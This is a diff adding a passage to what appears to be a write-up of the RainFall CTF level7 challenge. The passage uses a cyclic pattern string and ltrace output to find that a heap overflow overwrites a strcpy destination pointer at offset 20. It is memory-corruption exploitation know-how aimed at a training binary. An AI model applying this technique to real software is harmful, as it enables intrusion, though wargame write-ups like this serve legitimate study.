@@ -88,5 +88,20 @@ All defined functions:
 (gdb) x/i 0x8048400
    0x8048400 <puts@plt>:	jmp    *0x8049928
 ```
+Next, let's work out our payload. 
+We'll use this [buffer overflow EIP offset string generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to work out which offset is being overwritten. 
+```
+level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+__libc_start_main(0x8048521, 2, 0xbffff744, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                        = 0x0804a008
+malloc(8)                                        = 0x0804a018
+malloc(8)                                        = 0x0804a028
+malloc(8)                                        = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+It looks like the program segfaults at 0x37614136, and if we plug that into our [handy link](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find the offset is 20. 
 
 
